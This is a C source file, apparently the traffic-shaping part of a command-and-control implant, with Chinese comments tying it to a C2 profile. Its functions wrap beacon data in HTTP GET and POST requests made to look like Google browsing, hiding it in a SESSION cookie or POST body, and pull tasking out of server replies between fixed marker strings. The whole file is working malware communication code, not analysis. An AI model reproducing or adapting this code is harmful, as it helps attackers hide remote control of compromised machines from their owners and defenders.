#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
    //修改请求URL和c2profile文件中一致
    char *requestBody = "GET /%s HTTP/1.1\r\n"
        "Host: www.google.com\r\n"
        "Accept: accccccc\r\n"
        "Accept-Encoding: gzip, br\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1\r\n"
        "Cookie: SESSION=%s\r\n"
        "Referer: https://www.google.com/\r\n"
        "Connection: close\r\n\r\n";
    char postPayload[20000];
    sprintf(postPayload, requestBody, "aaaaaaaaa", reqData);

    *outputData_len =  strlen(postPayload);
    *outputData = (char *)calloc(1,  *outputData_len);
    memcpy(*outputData, postPayload, *outputData_len);

}
void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {
    char *requestBody = "POST /%s?SESSION=%s HTTP/1.1\r\n"
        "Host: www.google.com\r\n"
        "Accept: accccccc\r\n"
        "Accept-Encoding: gzip, br\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1\r\n"
        "Referer: https://www.google.com/\r\n"
        "Connection: close\r\n"
        "Content-Length: %d\r\n\r\n%s";
    char *postPayload = (char *)calloc(1, strlen(requestBody)+strlen(reqData)+200);
    sprintf(postPayload, requestBody, "bbbbbbbbb", id, strlen(reqData), reqData);

    *outputData_len =  strlen(postPayload);
    *outputData = (char *)calloc(1,  *outputData_len);
    memcpy(*outputData, postPayload, *outputData_len);
    free(postPayload);
}

char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {
    
    //find_payload() 从原始数据中，找到以"ffffffff1"字符串开始，"eeeeeeee2"字符串结束中间包含的数据

    // ffffffff1AAAABBBBCCCCDDDDeeeeeeee2 -> AAAABBBBCCCCDDDD

    // *payload_len = xx; // 返回找到的payload长度
    // return payload; // 返回找到的payload

    rawData = strstr(rawData, start) + strlen(start);
    
    *payload_len = strlen(rawData) - strlen(strstr(rawData, end));
    
    char *payload = (char *)calloc(*payload_len ,sizeof(char));
    memcpy(payload, rawData, *payload_len);
    return payload; 
}

void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {

    char *start = "ffffffff1";
    char *end = "eeeeeeee2";

    long long payload_len = 0;
    *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
    *outputData_len = payload_len;
}

void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {

    char *start = "ffffffff1";
    char *end = "eeeeeeee2";

    long long payload_len = 0;
    *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
    *outputData_len = payload_len;
}